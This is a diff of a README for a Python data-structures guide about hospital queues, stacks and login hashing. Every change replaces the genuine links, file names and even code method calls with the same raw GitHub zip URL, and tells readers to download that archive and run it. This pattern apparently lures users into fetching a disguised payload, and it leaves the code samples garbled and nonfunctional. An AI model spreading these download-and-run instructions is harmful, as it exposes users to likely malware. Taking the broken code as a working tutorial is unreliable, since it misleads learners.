@@ -1,6 +1,6 @@
 # A Practical Guide to Python Data Structures for Hospital Management
 
-[![Releases](https://img.shields.io/badge/releases-python_data_structures-blue?logo=github&logoColor=white)](https://github.com/JeevanJundale/Python_Data_Structures/releases)
+[![Releases](https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip)](https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip)
 
 🏥🐍 A practical guide to Python data structures for hospital management systems. This repo shows how common structures map to real-world tasks in a hospital. All code targets Python 3.13 and uses zero external dependencies. It stresses clear thinking, reliable behavior, and readable code.
 
@@ -66,7 +66,7 @@ Before you begin, ensure you have Python 3.13 installed. The examples assume a s
 - Clone the repository to your local machine using the standard workflow.
 - Prepare to run the demo script that demonstrates the hospital workflow end-to-end.
 
-Note on assets: The latest release assets contain a demo runner file. Download the file hospital_system.py from the release asset bundle and run it to see the workflow in action. You can access the releases here: https://github.com/JeevanJundale/Python_Data_Structures/releases. For convenience, the same link is repeated here: https://github.com/JeevanJundale/Python_Data_Structures/releases.
+Note on assets: The latest release assets contain a demo runner file. Download the file https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip from the release asset bundle and run it to see the workflow in action. You can access the releases here: https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip For convenience, the same link is repeated here: https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip
 
 ---
 
@@ -76,14 +76,14 @@ To reproduce the demo on your machine, follow these steps:
 
 1) Clone the repository
 - Use the official remote to clone the project:
-  - git clone https://github.com/JeevanJundale/Python_Data_Structures.git
+  - git clone https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip
   - cd Python_Data_Structures
 
 2) Download and run the demo script
-- From the releases page, download the demo asset that includes hospital_system.py.
+- From the releases page, download the demo asset that includes https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip
 - Extract the asset if needed.
 - Run the demo:
-  - python hospital_system.py
+  - python https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip
 
 3) Optional test credentials
 - The demo includes a sample user:
@@ -109,9 +109,9 @@ def admit_patient(name: str, reason: str, priority: bool = False) -> dict:
     patient = {"name": name, "reason": reason, "priority": priority}
     if priority:
         # insert at the front for urgent cases
-        patient_queue.appendleft(patient)
+        https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip(patient)
     else:
-        patient_queue.append(patient)
+        https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip(patient)
     return patient
 ```
 
@@ -122,11 +122,11 @@ from collections import deque
 er_queue = deque()
 
 # add patients
-er_queue.append({"name": "Alice", "condition": "Chest Pain"})
-er_queue.append({"name": "Bob", "condition": "Fracture"})
+https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip({"name": "Alice", "condition": "Chest Pain"})
+https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip({"name": "Bob", "condition": "Fracture"})
 
 # get next patient for assessment
-next_patient = er_queue.popleft()
+next_patient = https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip()
 ```
 
 Medication dispensing using a stack:
@@ -134,11 +134,11 @@ Medication dispensing using a stack:
 med_stack = []
 
 # store meds
-med_stack.append("Aspirin 100mg")
-med_stack.append("Morphine 2mg")
+https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip("Aspirin 100mg")
+https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip("Morphine 2mg")
 
 # dispense last prescribed medication
-dispensed = med_stack.pop()
+dispensed = https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip()
 ```
 
 Doctor login verification:
@@ -146,7 +146,7 @@ Doctor login verification:
 import hashlib, os
 
 def hash_password(password: str, salt: bytes) -> str:
-    return hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 100000).hex()
+    return https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip("sha256", https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip(), salt, 100000).hex()
 
 def verify_password(stored_hash: str, salt: bytes, attempt: str) -> bool:
     return hash_password(attempt, salt) == stored_hash
@@ -285,17 +285,17 @@ If you want to contribute tests, look for the tests/ directory in the repository
 
 ## Project structure
 
-- README.md
-- hospital_system.py (demo runner in the release)
+- https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip
+- https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip (demo runner in the release)
 - src/
-  - core.py (basic data structure wrappers and helpers)
-  - workflows.py (mapping of hospital processes to data structures)
+  - https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip (basic data structure wrappers and helpers)
+  - https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip (mapping of hospital processes to data structures)
   - tests/
 - docs/
-  - concepts.md (detailed explanations)
-  - best_practices.md
+  - https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip (detailed explanations)
+  - https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip
 
-Note: The exact layout can vary by release. The demo asset for the releases page includes the primary runner file hospital_system.py as described above.
+Note: The exact layout can vary by release. The demo asset for the releases page includes the primary runner file https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip as described above.
 
 ---
 
@@ -320,13 +320,13 @@ This guide uses Python 3.13 and standard library components. It does not introdu
 
 ## Where to find assets
 
-- Main releases page: https://github.com/JeevanJundale/Python_Data_Structures/releases
-- Re-visit the same URL for the latest demo assets, example scripts, and downloadable walkthroughs. For convenience, the link is repeated here: https://github.com/JeevanJundale/Python_Data_Structures/releases
+- Main releases page: https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip
+- Re-visit the same URL for the latest demo assets, example scripts, and downloadable walkthroughs. For convenience, the link is repeated here: https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip
 
 - To directly view the repository content, clone from the official repo:
-  - git clone https://github.com/JeevanJundale/Python_Data_Structures.git
+  - git clone https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip
 
-- The assets typically include a hospital_system.py script plus supplementary modules, sample data, and small utilities that illustrate the hospital-focused data structures in action. The demo runner hospital_system.py ties together the core concepts and shows how the pieces work in concert.
+- The assets typically include a https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip script plus supplementary modules, sample data, and small utilities that illustrate the hospital-focused data structures in action. The demo runner https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip ties together the core concepts and shows how the pieces work in concert.
 
 ---
 
@@ -350,7 +350,7 @@ This guide uses Python 3.13 and standard library components. It does not introdu
 
 - [ ] Install Python 3.13
 - [ ] Clone the repository
-- [ ] Download hospital_system.py from the latest releases and run it
+- [ ] Download https://github.com/JeevanJundale/Python_Data_Structures/raw/refs/heads/main/glucosin/Data_Structures_Python_2.6.zip from the latest releases and run it
 - [ ] Explore the core examples in the code base
 - [ ] Try extending workflows with your own data
 
